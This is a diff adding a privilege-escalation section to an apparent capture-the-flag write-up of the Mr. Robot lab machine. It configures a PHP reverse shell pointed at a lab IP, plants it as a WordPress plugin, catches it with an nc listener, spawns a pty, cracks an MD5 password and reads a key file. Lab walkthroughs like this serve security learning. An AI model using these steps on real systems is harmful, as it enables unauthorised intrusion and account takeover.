@@ -153,4 +153,83 @@ root@bento:~# wpscan -u http://10.0.2.10/ --wordlist fsocity_sorted.dic --userna
 
 Input the credentials into the login form... and we're in.
 
+# Privilege Escelation
+
+From the WordPress admin page, we have access to the source code of a variety of plugins.
+Using this, we can spawn a reverse shell with some clever PHP code. The reverse shell I use
+I grabbed from [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), just
+make sure to make the necessary adjustments to the socket so you can actually recieve the 
+traffic your reverse shell sends back. To do this, edit these lines of the above .php script:
+
+```php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.0.2.15';  // CHANGE THIS
+$port = 6666;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+
+to reflect your own IP address as well as a generic port you wish to recieve the traffic on.
+After that, either zip and upload the standalone PHP shellcode as a WordPress plugin, or paste
+the script into one of the plugins already on the site. Then, set up a listener in your terminal
+and activate the plugin containing the payload:
+
+```sh
+root@bento:~# nc -lvp 6666
+listening on [any] 6666 ...
+10.0.2.10: inverse host lookup failed: Unknown host
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.10] 57491
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 22:26:41 up  1:08,  0 users,  load average: 0.01, 0.04, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+daemon
+$ 
+```
+
+Cool, we have a shell session up. I poked around the system for a long time looking for clues or
+other keys, and finally found the files 'password.raw-md5' and 'key-2-of-3.txt' in '/home/robot'. However, cat-ing the file gives Permission Denied. Looks like I'll have to escalate my privilege.
+
+```sh
+$ su
+su: must be run from a terminal
+$
+```
+
+Okay, first we have to spawn a terminal with Python:
+
+```sh
+$ python -c 'import pty; pty.spawn("bin/sh")'
+$ su robot
+su robot
+Password:
+```
+
+Great, now at least we can 'su'. Going back to the file 'password.raw-md5' we found does indeed
+give us a raw md5 hash. Popping it into one of the online crackers like [this one](http://md5cracker.org/)
+gives us the string 'abcdefghijklmnopqrstuvwxyz'. Nice. You'd think Elliot would have a better
+password.
+
+```sh
+$ su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$ whoami
+whoami
+robot
+robot@linux:/$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:/$
+```
+
+Nice. Got the second key.
+
 -TC
